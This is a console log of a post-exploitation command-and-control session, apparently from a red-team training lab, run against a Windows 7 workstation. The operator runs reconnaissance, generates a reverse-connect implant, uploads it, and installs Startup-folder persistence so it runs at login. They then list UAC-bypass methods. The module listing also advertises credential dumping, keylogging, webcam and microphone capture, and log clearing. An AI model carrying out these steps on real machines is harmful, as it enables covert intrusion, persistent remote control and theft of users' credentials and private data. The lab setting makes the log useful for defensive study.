id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> 
>> info
hostname       RSRCH-WIN7-WS1                                       
user           RESEARCH\kroberts                                    
release        7                                                    
version        6.1.7601                                             
os_arch        AMD64                                                
proc_arch      32bit                                                
pid            2668                                                 
exec_path      C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
cid            0000000006b319b0                                     
address        172.16.0.7                                           
macaddr        1e:97:2d:f3:32:85                                    
revision       ?                                                    
node           1e972df33285                                         
native         True                                                 
proxy          ?                                                    
external_ip    ?                                                    
uac_lvl        2/3                                                  
intgty_lvl     Medium                                               
local_adm      Yes                                                  
transport      tcp_cleartext                                        
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
platform       windows/x86                                          
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4064 C:\Windows\System32\conhost.exe 21440309532060843664390671815415894643-14328960741663172516-372837770-841349633
4360 {taskeng.exe} 
4412 C:\Windows\SysWOW64\cmd.exe /K CHCP 437
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> ip
isatap.merk-pharm.com        LINK   00-00-00-00-00-00-00-E0  
                             INET6  fe80::5efe:192.168.4.28  
Local Area Connection        LINK   1E-97-2D-F3-32-85        
                             INET   192.168.4.28             
Loopback Pseudo-Interface 1  INET   127.0.0.1                
                             INET6  ::1                      
>> pwd
[+] C:\Users\kroberts.RESEARCH\Downloads
>> ls
C:\Users\kroberts.RESEARCH\Downloads:
  13/01/19  D      0.0B Win7AndW2K8R2-KB3191566-x64 (1)         
  13/01/19  +     42.7M Win7-KB3191566-x86.zip                  
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64 (1).zip     
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64.zip         
  23/12/18       282.0B desktop.ini                             
  11/02/19  +      9.3M domain-check.ps1                        
  02/02/19  +      6.2K ms-2018.hta                             
  02/02/19  +      5.6K update-instructions.doc                 
[%] Summary: Files: 7 (size: 181.9M) Dirs: 1 Total: 8
>> ls
C:\Users\kroberts.RESEARCH\Downloads:
  13/01/19  D      0.0B Win7AndW2K8R2-KB3191566-x64 (1)         
  13/01/19  +     42.7M Win7-KB3191566-x86.zip                  
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64 (1).zip     
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64.zip         
  23/12/18       282.0B desktop.ini                             
  11/02/19  +      9.3M domain-check.ps1                        
  02/02/19  +      6.2K ms-2018.hta                             
  02/02/19  +      5.6K update-instructions.doc                 
[%] Summary: Files: 7 (size: 181.9M) Dirs: 1 Total: 8
>> cd ..
>> ls
C:\Users\kroberts.RESEARCH:
  23/12/18  D      0.0B AppData                                 
  23/12/18  D      0.0B Application Data                        
  23/12/18  D      0.0B Contacts                                
  23/12/18  D      0.0B Cookies                                 
  13/01/19  D      0.0B Desktop                                 
  23/12/18  D      0.0B Documents                               
  11/02/19  D      0.0B Downloads                               
  23/12/18  D      0.0B Favorites                               
  23/12/18  D      0.0B Links                                   
  23/12/18  D      0.0B Local Settings                          
  23/12/18  D      0.0B Music                                   
  23/12/18  D      0.0B My Documents                            
  23/12/18  D      0.0B NetHood                                 
  23/12/18  D      0.0B Pictures                                
  23/12/18  D      0.0B PrintHood                               
  23/12/18  D      0.0B Recent                                  
  23/12/18  D      0.0B Saved Games                             
  23/12/18  D      0.0B Searches                                
  23/12/18  D      0.0B SendTo                                  
  23/12/18  D      0.0B Start Menu                              
  23/12/18  D      0.0B Templates                               
  23/12/18  D      0.0B Videos                                  
  13/02/19       768.0K NTUSER.DAT                              
  24/12/18        64.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
  24/12/18       512.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
  24/12/18       512.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
  13/02/19       256.0K ntuser.dat.LOG1                         
  23/12/18         0.0B ntuser.dat.LOG2                         
  23/12/18        20.0B ntuser.ini                              
[%] Summary: Files: 7 (size: 2.1M) Dirs: 22 Total: 29
>> netstart
[-] Unknown (or unavailable) command netstart. Use help -M to list available commands and modules
>> netstat
AF     TYPE    LADDR               RADDR               USER                 PID   EXE                                                  
---------------------------------------------------------------------------------------------------------------------------------------
INET   STREAM  192.168.4.28:60390  192.168.1.10:445    NT AUTHORITY\SYSTEM  4                                                          
INET   STREAM  127.0.0.1:49162     127.0.0.1:49163                          1444                                                       
INET   DGRAM   192.168.4.28:137                        NT AUTHORITY\SYSTEM  4                                                          
INET   DGRAM   127.0.0.1:1900                                               1684                                                       
INET   STREAM  192.168.4.28:63956  172.16.40.201:8080                       2864                                                       
INET   DGRAM   0.0.0.0:3702                                                 1684                                                       
INET6  DGRAM   :::3702                                                      1684                                                       
INET   STREAM  192.168.4.28:63906  172.16.40.201:8080                       2864                                                       
INET   DGRAM   192.168.4.28:5353                                            1940                                                       
INET   DGRAM   127.0.0.1:54339                         RESEARCH\kroberts    3428  \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe  
INET   DGRAM   192.168.4.28:64667                                           1684                                                       
INET   STREAM  192.168.4.28:65435  172.16.11.76:8888                        1444                                                       
INET   STREAM  192.168.4.28:63480  162.125.33.7:443    RESEARCH\kroberts    2668  C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
INET   DGRAM   0.0.0.0:57075                                                1980                                                       
INET   DGRAM   127.0.0.1:64668                                              1684                                                       
INET6  DGRAM   ::1:1900                                                     1684                                                       
INET6  DGRAM   :::49998                                                     1684                                                       
INET   STREAM  192.168.4.28:64020  172.16.11.106:8888  RESEARCH\kroberts    2668  C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
INET   DGRAM   192.168.4.28:1900                                            1684                                                       
INET   STREAM  127.0.0.1:49163     127.0.0.1:49162                          1444                                                       
INET6  DGRAM   ::1:64666                                                    1684                                                       
INET   DGRAM   0.0.0.0:49997                                                1684                                                       
INET   DGRAM   0.0.0.0:123                                                  920                                                        
INET   STREAM  192.168.4.28:54752  172.16.40.202:5044                       132                                                        
INET   DGRAM   127.0.0.1:59283                                              276                                                        
INET6  DGRAM   :::123                                                       920                                                        
INET   DGRAM   0.0.0.0:5355                                                 1044                                                       
INET   STREAM  192.168.4.28:54953  162.125.6.3:443     RESEARCH\kroberts    2668  C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
INET6  DGRAM   ::1:5353                                                     1940                                                       
INET   DGRAM   192.168.4.28:138                        NT AUTHORITY\SYSTEM  4                                                          
INET   DGRAM   127.0.0.1:62310                                              1044                                                       
INET   DGRAM   0.0.0.0:59280                                                1940                                                       
INET6  DGRAM   :::59281                                                     1940                                                       
INET   STREAM  192.168.4.28:63251  54.210.107.85:443   RESEARCH\kroberts    2668  C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
INET   DGRAM   127.0.0.1:52741                                              480                                                        
INET   STREAM  192.168.4.28:60429  172.16.11.115:443   RESEARCH\kroberts    3428  \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe  
INET   DGRAM   127.0.0.1:56080                                              2864                                                       
INET   STREAM  192.168.4.28:65433  172.16.11.76:8888                        1444                                                       
INET   STREAM  192.168.4.28:63966  172.16.40.201:8080                       2864                                                       
INET   STREAM  192.168.4.28:65434  172.16.11.76:8888                        1444                                                       
[*] Session 2 opened (RESEARCH\kroberts) (172.16.11.106:8888 <- 172.16.0.7:22920)
>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
2   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> sessions -i 2
[+] Default filter set to 2
>> getpid
[+] PID: 4412
>> ps 
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4064 C:\Windows\System32\conhost.exe 21440309532060843664390671815415894643-14328960741663172516-372837770-841349633
4412 C:\Windows\SysWOW64\cmd.exe /K CHCP 437
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> 
>> 
>> help persistence
Module: persistence: Enable / Disable Persistence

usage: persistence [-h] [-s] [-p PAYLOAD] [-n NAME] [-m METHOD] [-l]
                   [--remove]

Enable / Disable persistence 

optional arguments:
  -h, --help    show this help message and exit
  -s, --shared  prefer shared object (linux only)
  -p PAYLOAD    remote path or cmd to execute at login (windows only)
  -n NAME       custom name to use (windows only)
  -m METHOD     should be an ID, get the list (-l) scanning which methods are
                possible (windows only)
  -l            list all possible techniques for this host (windows only)
  --remove      remove persistence


{ Compatibility }
Y  PupyClient(id=2, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> persistence -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[+] 1	Persistence	True		False		Gain persistence using explorer and dll hijacking
[-] 2	Persistence	True		True		Gain persistence with system privilege using mofcomp and mof file
[-] 3	Persistence	True		True		Gain persistence with system privilege using schtasks
[-] 4	Persistence	True		True		Gain persistence using IFEO debugger registry key
[-] 5	Persistence	True		True		Gain persistence using Userinit registry key
[+] 6	Persistence	True		False		Gain persistence using HKEY_CURRENT_USER Run registry key
[-] 7	Persistence	True		True		Gain persistence using HKEY_LOCAL_MACHINE Run registry key
[-] 8	Persistence	True		True		Gain persistence with system privilege using wmic
[+] 9	Persistence	True		False		Gain persistence using Startup Files
[-] 10	Persistence	True		False		Gain persistence using Cortana app which loads at login
[-] 11	Persistence	True		False		Gain persistence using People app which loads at login
>> persistence -n Lab5 -m 9
[-] Add payload (remote path to execute at login)
>> gen
[%] Connection point: Transport=tcp_cleartext Address=172.16.11.106:8888
[+] Generate client: windows/x86

{ Configuration }
KEY            VALUE                                       
-----------------------------------------------------------
launcher       connect                                     
launcher_args  -t tcp_cleartext --host 172.16.11.106:8888  
cid            0xe5f762c2L                                 

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] OUTPUT_PATH: /home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe
[+] SCRIPTLETS:  []
[+] DEBUG:       False
>> help upload
Module: upload: Upload A File/Directory To A Remote System

usage: upload [-h] <local_path> [<remote_path>]

upload a file/directory to a remote system 

positional arguments:
  <local_path>
  <remote_path>

optional arguments:
  -h, --help     show this help message and exit


{ Compatibility }
Y  PupyClient(id=2, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> upload /home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe 
>> pwd
[+] C:\
>> cd users
>> pwd
[+] C:\users
>> difr
[-] Unknown (or unavailable) command difr. Use help -M to list available commands and modules
>> dir
[-] Unknown (or unavailable) command dir. Use help -M to list available commands and modules
>> ls
C:\users:
  14/07/09  D      0.0B Default                                 
  14/07/09  D      0.0B Default User                            
  14/07/09  D      0.0B Public                                  
  22/12/18  D      0.0B kroberts                                
  23/12/18  D      0.0B kroberts.RESEARCH                       
  28/11/18  D      0.0B ol                                      
  14/07/09  L      0.0B All Users -> C:\ProgramData             
  14/07/09       174.0B desktop.ini                             
[%] Summary: Files: 2 (size: 174.0B) Dirs: 6 Total: 8
>> cd Public
>> ls
C:\users\Public:
  13/01/19  D      0.0B Desktop                                 
  14/07/09  D      0.0B Documents                               
  14/07/09  D      0.0B Downloads                               
  13/07/09  D      0.0B Favorites                               
  14/07/09  D      0.0B Libraries                               
  14/07/09  D      0.0B Music                                   
  14/07/09  D      0.0B Pictures                                
  14/07/09  D      0.0B Recorded TV                             
  14/07/09  D      0.0B Videos                                  
  14/07/09       174.0B desktop.ini                             
[%] Summary: Files: 1 (size: 174.0B) Dirs: 9 Total: 10
>> cd Downloads
>> pwd
[+] C:\users\Public\Downloads
>> upload /home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe C:\users\Public\Downloads
[%] Uploading local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe to remote:C:usersPublicDownloads (size=3414528)
[+] file local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe uploaded to remote:C:usersPublicDownloads
>> ls
C:\users\Public\Downloads:
  14/07/09       174.0B desktop.ini                             
  13/02/19         3.3M usersPublicDownloads                    
[%] Summary: Files: 2 (size: 3.3M) Dirs: 0 Total: 2
>> ls 
C:\users\Public\Downloads:
  14/07/09       174.0B desktop.ini                             
  13/02/19         3.3M usersPublicDownloads                    
[%] Summary: Files: 2 (size: 3.3M) Dirs: 0 Total: 2
>> upload /home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe C:\users\Public\Downloads\file.exe
[%] Uploading local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe to remote:C:usersPublicDownloadsfile.exe (size=3414528)
[+] file local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe uploaded to remote:C:usersPublicDownloadsfile.exe
>> upload /home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe C:\\users\\Public\\Downloads\\file.exe
[%] Uploading local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe to remote:C:\users\Public\Downloads\file.exe (size=3414528)
[+] file local:/home/ol/.config/pupy/output/pupyx86.S0L5Tp.exe uploaded to remote:C:\users\Public\Downloads\file.exe
>> ls
C:\users\Public\Downloads:
  14/07/09       174.0B desktop.ini                             
  13/02/19         3.3M file.exe                                
  13/02/19         3.3M usersPublicDownloads                    
  13/02/19         3.3M usersPublicDownloadsfile.exe            
[%] Summary: Files: 4 (size: 9.8M) Dirs: 0 Total: 4
>> help persistence
Module: persistence: Enable / Disable Persistence

usage: persistence [-h] [-s] [-p PAYLOAD] [-n NAME] [-m METHOD] [-l]
                   [--remove]

Enable / Disable persistence 

optional arguments:
  -h, --help    show this help message and exit
  -s, --shared  prefer shared object (linux only)
  -p PAYLOAD    remote path or cmd to execute at login (windows only)
  -n NAME       custom name to use (windows only)
  -m METHOD     should be an ID, get the list (-l) scanning which methods are
                possible (windows only)
  -l            list all possible techniques for this host (windows only)
  --remove      remove persistence


{ Compatibility }
Y  PupyClient(id=2, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> persistence -p C:\\users\\Public\\Downloads\\file.exe -n Lab5 -m 9
[%] Attempting to run id (9) configured with payload (C:\users\Public\Downloads\file.exe)
[+] Startup file created: C:\Users\kroberts.RESEARCH\AppData\Roaming\Microsoft\\Windows\\Start Menu\\Programs\\Startup\Lab5.eu.url
[+] Successfully installed persistence, payload will run at login
>> help bypassuac
Module: bypassuac: 

usage: bypassuac [-h] [-l] [-e EXE] [-r] [-m METHOD]

optional arguments:
  -h, --help  show this help message and exit
  -l          List all possible techniques for this host
  -e EXE      Custom exe to execute as admin
  -r          Restart current executable as admin
  -m METHOD   Should be an ID, get the list scanning which methods are
              possible (-l)


{ Compatibility }
Y  PupyClient(id=2, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> bypassuac -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[-] 1	UAC bypass	True		False		Bypass UAC using runas, this only works if UAC is set to never notify
[-] 2	UAC bypass	True		False		Bypass UAC using fodhelper and registry key manipulation
[-] 3	UAC bypass	True		False		Bypass UAC using slui and registry key manipulation
[-] 4	UAC bypass	True		False		Bypass UAC using silentcleanup and registry key manipulation
[-] 5	UAC bypass	True		False		Bypass UAC using sdclt (isolatedcommand) and registry key manipulation
[-] 6	UAC bypass	True		False		Bypass UAC using sdclt (app paths) and registry key manipulation
[+] 7	UAC bypass	True		False		Bypass UAC using perfmon and registry key manipulation
[+] 8	UAC bypass	True		False		Bypass UAC using eventviewer and registry key manipulation
[+] 9	UAC bypass	True		False		Bypass UAC using compmgmtlauncher and registry key manipulation
[-] 10	UAC bypass	True		False		Bypass UAC using computerdefaults and registry key manipulation
[+] 11	UAC bypass	True		False		Bypass UAC using cliconfg (DLL) and registry key manipulation
[+] 12	UAC bypass	True		False		Bypass UAC using mcx2prov (DLL) and registry key manipulation
[+] 13	UAC bypass	True		False		Bypass UAC using migwiz (DLL) and registry key manipulation
[+] 14	UAC bypass	True		False		Bypass UAC using sysprep (DLL) and registry key manipulation
>> 

